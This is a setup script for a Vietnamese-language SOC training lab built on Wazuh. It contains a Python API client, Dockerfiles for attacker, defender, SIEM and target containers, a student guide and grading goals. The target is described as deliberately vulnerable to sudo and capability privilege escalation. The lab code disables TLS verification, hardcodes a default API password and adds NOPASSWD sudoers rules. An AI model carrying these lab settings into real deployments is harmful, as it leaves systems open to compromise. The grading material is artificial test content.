            show(out)
    except WazuhError as e:
        print("LOI: %s" % e)
        sys.exit(1)
    finally:
        api.logtest_close(token)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/soc-tools"
cat > "$LAB/defender/soc-tools/wzapi.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# wzapi.py - client toi gian cho Wazuh API (cong 55000). Chi dung thu vien chuan.
# Dung chung cho: kiem-thu-luat, thu-dong, replay.py (defender) va grade (siem).
#
# Cau hinh (bien moi truong, co mac dinh cho lab):
#   WZ_API_URL   (mac dinh https://172.20.0.20:55000)
#   WZ_API_USER  (mac dinh bai17-tool)
#   WZ_API_PASS  (mac dinh xem DEFAULT_PASS)
# ============================================================================
import base64, json, os, ssl, time, urllib.error, urllib.parse, urllib.request

DEFAULT_URL = "https://172.20.0.20:55000"
DEFAULT_USER = "soc-tool"
DEFAULT_PASS = "Soc.Tool.2026!"

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class WazuhError(Exception):
    pass


class Wazuh:
    def __init__(self, url=None, user=None, password=None, timeout=30):
        self.url = (url or os.environ.get("WZ_API_URL") or DEFAULT_URL).rstrip("/")
        self.user = user or os.environ.get("WZ_API_USER") or DEFAULT_USER
        self.password = password or os.environ.get("WZ_API_PASS") or DEFAULT_PASS
        self.timeout = timeout
        self.token = None

    # ---------------- tang thap ----------------
    def _req(self, method, path, body=None, raw=None, ctype="application/json", auth=True, params=None, _try=0):
        url = self.url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        data = None
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8")
        elif body is not None:
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", ctype)
        if auth:
            if not self.token:
                self.login()
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                txt = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            txt = e.read().decode("utf-8", "replace")
            if e.code == 401 and auth and self.token:
                # token het han -> dang nhap lai 1 lan
                self.token = None
                return self._req(method, path, body, raw, ctype, auth, params)
            if e.code == 500 and '"error": 3021' in txt and _try < 3:
                # 3021 = "Timeout executing API request": may ao qua tai, manager cham -> thu lai
                time.sleep(5 * (_try + 1))
                return self._req(method, path, body, raw, ctype, auth, params, _try + 1)
            raise WazuhError("HTTP %s %s %s: %s" % (e.code, method, path, txt[:400]))
        except Exception as e:
            raise WazuhError("%s %s: %s" % (method, path, e))
        try:
            return json.loads(txt) if txt else {}
        except ValueError:
            return {"raw": txt}

    def login(self):
        url = self.url + "/security/user/authenticate"
        req = urllib.request.Request(url, data=b"", method="POST")
        cred = base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                self.token = json.loads(r.read().decode())["data"]["token"]
        except urllib.error.HTTPError as e:
            raise WazuhError("Dang nhap API that bai (HTTP %s) - API chua san sang hoac sai tai khoan" % e.code)
        except Exception as e:
            raise WazuhError("Khong ket noi duoc Wazuh API %s: %s" % (self.url, e))
        return self.token

    # ---------------- ruleset ----------------
    def get_rule_file(self, name):
        r = self._req("GET", "/rules/files/" + name, params={"raw": "true"})
        return r.get("raw", "") if isinstance(r, dict) else r

    @staticmethod
    def _check_items(r, what):
        """API tra HTTP 200 ca khi KHONG ghi duoc file: loi nam trong data.failed_items."""
        d = (r or {}).get("data") or {}
        fails = d.get("failed_items") or []
        if fails or (d.get("total_affected_items") == 0 and "affected_items" in d):
            raise WazuhError("Wazuh KHONG ghi %s: %s" % (what, json.dumps(fails or r, ensure_ascii=False)[:500]))
        return r

    def put_rule_file(self, name, content):
        return self._check_items(self._req("PUT", "/rules/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    def put_list_file(self, name, content):
        return self._check_items(self._req("PUT", "/lists/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    # ---------------- manager ----------------
    def validate(self):
        """Tra ve (ok, thong_bao)."""
        r = self._req("GET", "/manager/configuration/validation")
        items = (r.get("data") or {}).get("affected_items") or []
        for it in items:
            if it.get("status") != "OK":
                return False, json.dumps(it.get("details", it), ensure_ascii=False)[:800]
        fails = (r.get("data") or {}).get("failed_items") or []
        if fails:
            return False, json.dumps(fails, ensure_ascii=False)[:800]
        return True, "OK"

    def restart(self, wait=240):
        """PUT /manager/restart chi XEP LICH restart (bat dong bo): vai giay dau /manager/status van
        bao tien trinh CU 'running' -> neu tra ve luc do, phat lai se chay tren bo luat CU.
        Phai thay manager XUONG (API mat ket noi / analysisd khong running) roi moi cho no LEN lai."""
        self._req("PUT", "/manager/restart")
        t0 = time.time()
        seen_down = False
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                self.token = None
                st = self._req("GET", "/manager/status")
                items = (st.get("data") or {}).get("affected_items") or [{}]
                up = items[0].get("wazuh-analysisd") == "running"
            except WazuhError:
                up = False
            if not up:
                seen_down = True
            elif seen_down or time.time() - t0 > 60:
                # da thay xuong roi len (hoac qua 60s ma khong bat duoc luc xuong) -> cho analysisd nap xong
                time.sleep(10)
                return True
        return False

    # ---------------- logtest ----------------
    def logtest(self, event, token=None, location="/var/log/auth.log", log_format="syslog"):
        body = {"event": event, "log_format": log_format, "location": location}
        if token:
            body["token"] = token
        r = self._req("PUT", "/logtest", body=body)
        d = r.get("data") or {}
        return d.get("token"), d.get("output") or {}

    def logtest_close(self, token):
        if not token:
            return
        try:
            self._req("DELETE", "/logtest/sessions/" + token)
        except WazuhError:
            pass
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.attacker.student" <<'__EOF_LAB_SOC_PRIVESC__'
#
# Labtainer Dockerfile - attacker (leo quyen qua foothold emp<EMPNUM>, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# sshpass: SSH khong tuong tac bang mat khau emp<EMPNUM>; curl: cho siem seed xong truoc khi tan cong
RUN apt-get update && apt-get install -y --no-install-recommends sshpass openssh-client curl ca-certificates \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.defender.student" <<'__EOF_LAB_SOC_PRIVESC__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
# Bai 17: python3 cho cong cu kiem-thu-luat / thu-dong / goi-y (thu vien chuan, khong can pip)
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client python3 \
    && rm -rf /var/lib/apt/lists/*
#
# Mat khau dashboard: moi thanh vien dung anh soc-wazuh rieng -> mat khau khac nhau.
# Lay tu CHINH anh nen ma siem dung (cung tag voi FROM cua siem) -> luon khop khi rebuild lab.
COPY --from=localhost:5000/soc-wazuh:latest /root/wazuh-admin-credentials.txt /tmp/wz-cred.txt
RUN mkdir -p /etc/soc-tools \
 && P=$(sed -n "s/^ *indexer_password: *'\(.*\)' *$/\1/p" /tmp/wz-cred.txt | head -1) \
 && printf 'Wazuh dashboard: https://172.20.0.20\nTai khoan: admin\nMat khau : %s\n' "$P" > /etc/soc-tools/dashboard.txt \
 && chmod 644 /etc/soc-tools/dashboard.txt && rm -f /tmp/wz-cred.txt \
 && test -n "$P"
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.siem.student" <<'__EOF_LAB_SOC_PRIVESC__'
#
# siem (Bai 17) - dung anh nen chung soc-wazuh (Wazuh cai san). TERMINALS 0 (an voi sinh vien).
# Boot-hook Labtainers (fixlocal/parameter) BI BO QUA tren anh chung -> khoi tao bang SYSTEMD:
#   seed-bai17.service : luat san xuat 100300, decoder sudo.program, 3 CDB list, user API, tap kiem tra an
#   grade-bai17.path   : moi khi local_rules.xml / lists doi -> grade-bai17.service cham lai phan luat
# LUU Y: KHONG chay apply-shared-siem.sh len lab nay nua (file nay da la ban dung anh chung).
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
RUN (command -v python3 >/dev/null 2>&1) || (apt-get update && apt-get install -y --no-install-recommends python3 && rm -rf /var/lib/apt/lists/*) || true
#
# prestop (user ubuntu) duoc: doc marker seed, chay grader, xem agent
RUN printf '%s\n' \
  'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /root/.bai17/seeded, /usr/bin/cat /root/.bai17/seeded, /usr/bin/python3 /home/ubuntu/bai17/grade17.py *, /var/ossec/bin/agent_control' \
  > /etc/sudoers.d/labtainer-bai17 && chmod 440 /etc/sudoers.d/labtainer-bai17
#
# === systemd: seed (1 lan) + cham luat khi luat doi ===
RUN printf '%s\n' \
  '[Unit]' \
  'Description=Bai 17 - khoi tao ruleset, user API, tap kiem tra an' \
  'After=wazuh-manager.service network-online.target' \
  'Wants=wazuh-manager.service' \
  '[Service]' \
  'Type=oneshot' \
  'RemainAfterExit=yes' \
  'TimeoutStartSec=900' \
  'ExecStart=/usr/bin/python3 /home/ubuntu/bai17/seed17.py' \
  'ExecStartPost=/usr/bin/python3 /home/ubuntu/bai17/grade17.py rules 5' \
  '[Install]' \
  'WantedBy=multi-user.target' \
  > /etc/systemd/system/seed-bai17.service \
 && printf '%s\n' \
  '[Unit]' \
  'Description=Bai 17 - cham lai luat cua sinh vien khi luat/list doi' \
  '[Path]' \
  'PathChanged=/var/ossec/etc/rules/local_rules.xml' \
  'PathChanged=/var/ossec/etc/lists' \
  'Unit=grade-bai17.service' \
  '[Install]' \
  'WantedBy=multi-user.target' \
  > /etc/systemd/system/grade-bai17.path \
 && printf '%s\n' \
  '[Unit]' \
  'Description=Bai 17 - phat lai tap kiem tra an' \
  'After=seed-bai17.service' \
  '[Service]' \
  'Type=oneshot' \
  'TimeoutStartSec=600' \
  'ExecStart=/usr/bin/python3 /home/ubuntu/bai17/grade17.py rules 20' \
  > /etc/systemd/system/grade-bai17.service \
 && mkdir -p /etc/systemd/system/multi-user.target.wants \
 && ln -sf /etc/systemd/system/seed-bai17.service /etc/systemd/system/multi-user.target.wants/seed-bai17.service \
 && ln -sf /etc/systemd/system/grade-bai17.path /etc/systemd/system/multi-user.target.wants/grade-bai17.path \
 && mkdir -p /etc/systemd/system/wazuh-manager.service.d \
 && printf '[Service]\nTimeoutStartSec=600\n' > /etc/systemd/system/wazuh-manager.service.d/bai17-timeout.conf \
 && mkdir -p /etc/systemd/system/wazuh-indexer.service.d /etc/systemd/system/wazuh-dashboard.service.d \
 && printf '[Service]\nTimeoutStartSec=900\n' > /etc/systemd/system/wazuh-indexer.service.d/bai17-timeout.conf \
 && printf '[Unit]\nAfter=wazuh-indexer.service\n[Service]\nRestart=on-failure\nRestartSec=30\n' > /etc/systemd/system/wazuh-dashboard.service.d/bai17-order.conf
#
# === Dong bo mui gio voi VM (ICT = UTC+7) ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Entrypoint: khoi phuc quyen cac user Wazuh truoc systemd; don trang thai agent cu ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
RUN mkdir -p /home/$user_name/.local && echo "soc-privesc" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
CMD ["/entrypoint.sh"]
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.target.student" <<'__EOF_LAB_SOC_PRIVESC__'
#
# Labtainer Dockerfile - target (2 lo hong leo quyen + Wazuh agent)
#
ARG registry
# Base co openssh-server (sshd) + rsyslog -> emp<EMPNUM>/analyst SSH duoc
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cho prestop doc sudoers (440 root) khong mat khau
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/grep, /bin/grep, /usr/bin/cat, /bin/cat, /sbin/iptables, /usr/sbin/iptables, /usr/sbin/sshd -T' > /etc/sudoers.d/labtainer-pe \
    && chmod 440 /etc/sudoers.d/labtainer-pe
#
# Dam bao co sudo, findutils (find), mawk (awk), iptables (containment A3), cron (persistence B4)
RUN apt-get update && apt-get install -y --no-install-recommends sudo findutils mawk iptables cron \
    && rm -rf /var/lib/apt/lists/* || true
RUN systemctl enable cron 2>/dev/null || true
#
# Bai 17: setcap/getcap (H1), trinh thong dich (H1: python3/perl), trinh soan thao/xem file (H2),
# openssl/coreutils (mat khau ngau nhien cho tai khoan moi)
RUN apt-get update && apt-get install -y --no-install-recommends libcap2-bin perl python3 vim-tiny nano less \
    && rm -rf /var/lib/apt/lists/* || true
RUN [ -e /usr/bin/vim ] || ln -s /usr/bin/vim.tiny /usr/bin/vim
#
# --- Wazuh agent (bake, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_LAB_SOC_PRIVESC__'
================================================================================
 SOC LAB - BAI 17: DIEU TRA SU CO DA GIAI DOAN & BAO CAO IR (soc-privesc)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
May chu SSH 'target' cua Cong ty X vua bi chiem quyen root tu mot may noi bo da nam
trong tay nhom APT (172.20.0.5). Wazuh chi ghi duoc MOT canh bao dang chu y. Cac buoc
con lai cua ke tan cong, truoc va sau canh bao do, chua ai thay.

Ban chu tri vu viec: dung lai TOAN BO chuoi tan cong, cach ly, go sach, dong ca nhung
lo hong CUNG LOAI chua bi khai thac, viet luat de lan sau SIEM thay nhung buoc no da bo
lo, va viet bao cao su co cho ban giam doc.

Moi sinh vien co ten tai khoan, so tai khoan bi do, ten file, diem yeu va tap kiem tra
luat KHAC NHAU. Ban phai tu dieu tra tren he thong CUA MINH.

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
Sau bai nay, ban co the:
  - Tu MOT canh bao, lui ve truoc va tien ve sau de dung timeline TOAN CANH cua su co.
  - Xac dinh pham vi: ke tan cong vao bang gi, da lay gi di, da dung cua sau chua.
  - Cach ly truoc, go bo sau; don ca tao tac ke tan cong de lai.
  - Lap BAN DO PHU phat hien: giai doan nao SIEM thay, giai doan nao khong.
  - Viet 3 luat lap lo hong phat hien va kiem chung bang tap du lieu co nhan.
  - Hardening chu dong: tim va dong cac duong leo quyen/duy tri CUNG LOAI.
  - Viet bao cao IR theo khung NIST SP 800-61.

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* Vong doi IR (NIST SP 800-61): chuan bi -> phat hien & phan tich -> ngan chan, loai bo,
  khoi phuc -> hoat dong sau su co (bai hoc). Cach ly TRUOC de "cam mau".
* Canh bao dau tien hiem khi la buoc dau tien: SIEM thuong chi bat duoc giai doan giua
  hoac cuoi. Dieu tra phai lui lai trong log de tim cach ke tan cong vao.
* Do mat khau "rai cham": 1 mat khau, nhieu tai khoan, moi lan cach nhau xa -> moi tai
  khoan chi loi 1 lan va tan suat thap. Luat brute-force dem theo cua so ngan se khong thay.
* Leo quyen qua chuong trinh hop le: nhieu chuong trinh pho bien (trinh soan thao, trinh
  xem file, ngon ngu kich ban) co the mo shell. Neu chung chay bang sudo hoac mang quyen dac
  biet thi shell do la shell root. Tham khao offline: ~/tai-lieu/gtfobins-sudo.txt
* Linux capabilities: cap TUNG quyen root rieng le cho mot file thuc thi - mot co che leo
  quyen NGOAI bit SUID.
* sshd co tuy chon rieng cho dang nhap cua root. Xoa khoa la chua du neu lan sau ke tan
  cong cai khoa khac.
* Wazuh: luat tan suat (frequency/timeframe, same_* / different_*), CDB list (lookup),
  ngoai le bang luat con level 0, MITRE ATT&CK.
* Ban do phu phat hien: doi chieu tung giai doan cua su co voi viec SIEM co canh bao hay
  khong -> danh sach viec cho Detection Engineering.

4. MOI TRUONG & SO DO (TOPOLOGY)
--------------------------------------------------------------------------------
  attacker (172.20.0.5,  AN)  ke tan cong
  target   (172.20.0.10)      may bi xam nhap; co Wazuh agent + giam sat toan ven file
  siem     (172.20.0.20, AN)  Wazuh - dashboard https://172.20.0.20
  defender (172.20.0.30)      tram cua ban: Firefox + terminal + cong cu luat

  Dashboard:  tai khoan admin - mat khau: chay  cat /etc/soc-tools/dashboard.txt  tren defender
  Ung pho:    ssh analyst@target   (mat khau: analyst) - phieu: /home/analyst/findings.txt
  Cong cu tren defender:
    thu-dong "<dong log>"   chay 1 dong log qua Wazuh voi luat dang nap
    kiem-thu-luat           nap luat ~/luat/ + CDB list, phat lai tap ~/dev/, in P/R
    goi-y <pha> <cap>       goi y cap 2, 3 (cap 1 nam ngay trong tai lieu nay)
  Tai lieu: ~/sudo-da-duyet.csv, ~/admin-hosts.csv, ~/tai-lieu/

  *** DAU HIEU BAT DAU CA: chuoi tan cong mat ~22-28 phut ke tu khi khoi dong lab.
      Tren target:   cat /var/run/soc-ca-truc
      Khi file nay CO NOI DUNG, su co da xay ra xong va ca truc cua ban bat dau.
      Trong luc cho: doc tai lieu nay va ~/tai-lieu/. ***

5. NHIEM VU (TASKS)
--------------------------------------------------------------------------------
--- Pha 1: THAY - Nhan vu viec ---
  Muc tieu: nam "cai duoi" cua su co.
  - Tren dashboard, tim canh bao muc cao duy nhat; ghi may, gio, chu the.
  - TRUOC khi dieu tra, ghi du doan vao ~/du-doan.txt (SO_GIAI_DOAN, SO_CANH_BAO).
    Khong cham dung sai.
  - Dien TRUOC_B, TRUOC_C trong ~/khao-sat.txt.
  Goi y cap 1: canh bao ban co la CAI DUOI. Hoi: "ngay truoc do la gi?", "ngay sau do la gi?"

--- Pha 2: HIEU - Cach ly, dung timeline, go bo ---
  Task 2.1 - Cach ly: cat kha nang ke tan cong quay lai qua mang, TRUOC khi don dep.
    Cau hoi chieu sau: cach ly co lam dung MOI thu ke tan cong da cai khong? Thu gi van
    chay duoc ma khong can mang?
  Task 2.2 - Timeline toan canh: dien /home/analyst/findings.txt (khoi goc + khoi MO RONG).
    - Lui ve truoc: ke tan cong co mat khau tu dau? Bat dau tu luc nao?
    - Tien ve sau: cua sau da duoc DUNG chua? Lay gi di?
    - Gio ghi HH:MM, khop gio that trong log (dung sai +-1 phut), dung thu tu.
    Cau hoi chieu sau: vi sao CHINH tai khoan do bi chiem, trong khi nhieu tai khoan khac
    bi thu cung luc?
  Task 2.3 - Go bo: hai duong leo quyen, MOI lop persistence, khoa tai khoan bi chiem, va
    don MOI tao tac ke tan cong de lai - ke ca du lieu da bi chep ra.
  Goi y cap 1: lay duoc mat khau bang cach nao do TRUOC khi dang nhap thanh cong. Cai cua
  sau roi thi se dung.
  Tu kiem chung: checkwork.

--- Pha 3: BAT - Ban do phu va luat lap lo hong ---
  Task 3.1 - Ban do phu: dien COVER_0..COVER_6 trong findings.txt: voi bo luat NGUYEN TRANG
    (truoc khi ban nap gi), moi giai doan co canh bao level >= 10 khong (1/0)?
  Task 3.2 - Viet 3 luat trong ~/luat/local_rules.xml (dai ID ghi san trong file):
    L1  Tu MOT IP, dang nhap that bai tren NHIEU tai khoan khac nhau trong cua so DAI.
    L2  sudo chay chuong trinh thoat duoc shell (CDB list), tru CAP user-lenh da duyet
        trong ~/sudo-da-duyet.csv. Lab tach san duong dan chuong trinh vao truong
        sudo.program (xem bang thu-dong).
    L3  root dang nhap SSH thanh cong tu IP KHONG thuoc may chu quan tri con hieu luc
        (~/admin-hosts.csv).
    Rang buoc: level >= 10, co <mitre>, ngoai le dua tren truong va danh muc co can cu.
    Kiem thu: kiem-thu-luat (tap ~/dev/). Bai duoc cham tren tap kiem tra AN khac tap nay:
    dung liet ke dung tung gia tri thay trong tap phat trien.
  Cau hoi chieu sau: luat L1 cua ban co phan biet duoc "1 nguoi go nham 3 lan" voi
  "1 IP thu 12 tai khoan, moi tai khoan 1 lan" khong? Truong nao lam nen khac biet?
  Goi y cap 1: luat dang nap sau lan kiem-thu-luat cuoi chinh la bai nop.

--- Pha 4: TINH CHINH - Hardening chu dong ---
  Muc tieu: dong cac duong ke tan cong CHUA kip dung. Checklist ra soat:
    - Moi cach mot chuong trinh chay voi quyen cao hon nguoi goi - KHONG CHI bit SUID.
    - Moi quy tac sudo cua MOI user, doi chieu ~/sudo-da-duyet.csv.
    - Cau hinh dang nhap tu xa cua tai khoan dac quyen.
  Rang buoc: KHONG pha quyen hop le (quyen da duyet cua deploy phai con); KHONG tu khoa
  minh khoi may.
  Ghi moi thay doi vao ~/hardening.txt: diem yeu | vi sao nguy hiem | da lam gi | kiem chung.
  Goi y cap 1: va dung lo da bi chui la go bo; hardening la tim nhung lo CUNG LOAI.

--- Pha 5: Bao cao IR & phan tu ---
  - ~/bao-cao-ir.md theo khung co san (GV cham tay).
  - ~/phan-tu.txt: so du-doan.txt voi timeline va ban do phu that.
  - Dien SAU_B, SAU_C trong ~/khao-sat.txt.

6. NOP BAI (SUBMISSION)
--------------------------------------------------------------------------------
  checkwork -> tu kiem tra ;  stoplab -> nop bai.
  Muc cham chinh:
    incident_resolved, reported_iocs, timeline_reconstructed, contained, suid_fixed,
    sudo_fixed, persistence_removed, foothold_locked   (phan goc)
    timeline_full, spray_scope, mitre_ok, coverage_ok, rule_l1_ok, rule_l2_ok,
    rule_l3_ok, hardening_ok, artifact_removed          (phan mo rong)
  DAT BAI 17: bai17_pass = Y.
  Luu y: checkwork chi cham VIEC BAN LAM. Luat duoc cham lai moi khi ban chay kiem-thu-luat
  (doi ~30 giay roi moi checkwork).
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_LAB_SOC_PRIVESC__'
# goals.config - IR flagship: Dieu tra & Ung pho leo thang dac quyen
# Chi cham VIEC SINH VIEN LAM (bo threat_detected/agent_connected vi chung tu Y khi lab chay).
# Co: A1 bao cao IOC ca nhan hoa, A2 timeline khop gio that, A3 containment.

# A1: bao cao dung IOC ca nhan hoa cua CHINH MINH (vector co che + tai khoan + backdoor + IP)
reported_iocs          = boolean : ( _rep_v1 and _rep_v2 and _rep_acct and _rep_bd and _rep_ip )
# A2: dung lai timeline - 3 moc KHOP GIO THAT trong log va dung thu tu
timeline_reconstructed = boolean : _timeline

# Ung pho theo vong doi IR
# A3: Containment (chan IP cat beacon)
contained              = boolean : _contained
# Eradication - bit duong leo quyen
suid_fixed             = boolean : ( _marker and_not _suid_vuln )
sudo_fixed             = boolean : ( _marker and_not _sudo_vuln )
# Eradication - go SACH persistence nhieu lop (B4): UID0 user + SSH key + SUID backdoor + cron
persistence_removed    = boolean : ( _marker and_not _backdoor and_not _sshkey and_not _suidbd and_not _cron )
foothold_locked        = boolean : ( _marker and_not _foothold_open )

# MUC TIEU TONG: Contain + Eradicate day du (chan IP + bit 2 duong leo quyen + go HET 4 lop persistence)
incident_resolved      = boolean : ( _marker and _contained and_not _suid_vuln and_not _sudo_vuln and_not _backdoor and_not _sshkey and_not _suidbd and_not _cron )

# =====================================================================================
# BAI 17 - GOAL MOI (noi them; 8 goal goc o tren GIU NGUYEN)
# =====================================================================================
# Timeline 7 giai doan: >= 6/7 moc khop gio that (+-1') va cac moc da dien dung thu tu
timeline_full    = boolean : _timeline_full
# Pham vi dot do mat khau (so tai khoan bi thu, tinh ca tai khoan bi chiem)
spray_scope      = boolean : _spray_n
# MITRE: >= 4/5 so hieu dung
mitre_ok         = boolean : _mitre_ok
# Ban do phu: >= 6/7 o dung VA moi truong that khop y do thiet ke (siem xac nhan)
coverage_ok      = boolean : ( _cover_ok and _cover_design )
# 3 luat lap lo hong: recall 100% va <= 1 FP tren tap kiem tra an; luat >= 10 deu co MITRE
rule_l1_ok       = boolean : ( _l1_ok and _rules_valid )
rule_l2_ok       = boolean : ( _l2_ok and _rules_valid )
rule_l3_ok       = boolean : ( _l3_ok and _rules_valid )
# Hardening 3 diem + KHONG pha quyen hop le cua deploy
hardening_ok     = boolean : ( _h_cap and _h_sudo and _h_ssh and _deploy_intact )
# Don tao tac: ban chep /etc/shadow (chi tinh khi ke tan cong da tao ra no)
